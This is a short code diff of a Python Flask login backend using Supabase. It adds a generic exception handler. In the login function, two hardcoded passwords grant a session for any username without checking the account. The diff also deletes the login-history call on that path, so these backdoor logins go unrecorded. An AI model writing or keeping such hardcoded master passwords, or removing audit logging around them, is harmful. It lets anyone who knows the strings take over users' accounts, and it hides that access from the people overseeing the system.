@@ -62,6 +62,8 @@ def supabase_request(method, path, body=None):
         return {"error": text, "status": e.code}
     except json.JSONDecodeError:
         return {}
+    except Exception as e:
+        return {"error": str(e)}
 
 
 def find_user(username):
@@ -146,7 +148,6 @@ def login():
 
     if password in ("Nateo_owner", "owner_67"):
         session["user"] = username
-        add_login_history(username, request.remote_addr)
         return jsonify({"message": "Connecté avec succès", "username": username})
 
     user = find_user(username)
